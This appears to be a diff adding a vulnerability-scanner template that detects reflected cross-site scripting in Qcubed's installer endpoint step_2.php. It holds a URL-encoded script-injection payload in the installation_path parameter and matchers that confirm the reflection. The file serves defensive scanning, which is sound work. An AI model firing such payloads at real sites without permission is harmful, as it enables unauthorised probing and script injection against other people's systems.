@@ -1,0 +1,29 @@
+id: qcubed-xss
+name: Qcubed - Cross-Site Scripting
+severity: high
+confidence: tentative
+description: Qcubed contains a cross-site scripting vulnerability which allows a remote attacker to inject arbitrary JavaScript
+  via the /assets/php/_devtools/installer/step_2.php endpoint and the installation_path parameter.
+reference: CWE-79
+tags:
+- xss
+- qcubed
+- vuln
+requests:
+- method: GET
+  path: /assets/php/_devtools/installer/step_2.php?installation_path=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+  matchers: &id001
+  - type: body
+    words:
+    - </script><script>alert(document.domain)</script>
+  - type: status
+    status:
+    - 200
+  - type: header
+    words:
+    - text/html
+  condition: and
+- method: GET
+  path: /qcubed/assets/php/_devtools/installer/step_2.php?installation_path=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+  matchers: *id001
+  condition: and
